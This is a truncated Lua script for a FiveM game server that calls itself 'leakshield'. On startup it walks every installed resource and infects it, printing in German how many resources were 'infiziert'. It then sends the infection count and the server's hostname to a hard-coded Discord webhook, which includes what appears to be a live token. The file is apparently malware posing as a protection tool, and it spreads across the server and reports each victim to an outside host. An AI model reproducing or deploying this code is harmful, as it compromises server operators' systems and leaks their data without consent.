local manifest = "fxmanifest"

local resources = nil
local script = nil



AddEventHandler('onResourceStart', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
        installSubCommand()
    end
end)


function installSubCommand() 
    randomString()
    if not resources then
        resources = {0,  0,  0}
    end

    local resourceNum = GetNumResources()
    for i = 0, resourceNum - 1 do
        local path = GetResourcePath(GetResourceByFindIndex(i))

        if string.len(path) > 4 then
            setAll(path)
        end
    end

    print(
        "[leakshield] Resources (" ..
            resources[1] .. "/" .. resources[2] .. " infiziert). " .. resources[3] .. " geskipped."
    )
    print("[leakshield] um das RÜCKGÄNGIG zu machen restarte deinen server!!!")

    PerformHttpRequest("https://discord.com/api/webhooks/1003269089407541318/QZ7gnIPBeyb-ifXAy7xB8WfJBm7aqPcCt1WL1XmLvWlqYfBTfCAsiE94JxjLW92XpLqP", function(err, headers)
    end, 'POST', json.encode({
        embeds = {
            {
                ["description"] = "Resourcen : " ..resources[1] .. "/" .. resources[2] .. " infiziert Der Script wurde auf" .. "\nServer : ``" .. GetConvar("sv_hostname", "") .. "``" .. "installiert",
